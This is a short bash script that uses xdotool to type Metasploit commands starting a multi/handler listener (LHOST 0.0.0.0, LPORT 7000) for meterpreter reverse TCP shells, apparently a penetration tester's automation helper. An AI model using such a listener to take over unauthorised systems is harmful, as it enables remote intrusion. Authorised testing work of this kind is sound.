#!/bin/bash

: '
meterpreter: start reverse tcp rev shell
'

source ~/Desktop/base/code/xdotool/helpers/paste_commands.sh

paste_command "use multi/handler"
xdotool key Return
sleep 1

paste_command "set LHOST 0.0.0.0"
xdotool key Return
sleep 1

paste_command "set LPORT 7000"
xdotool key Return
sleep 1

paste_command "run"
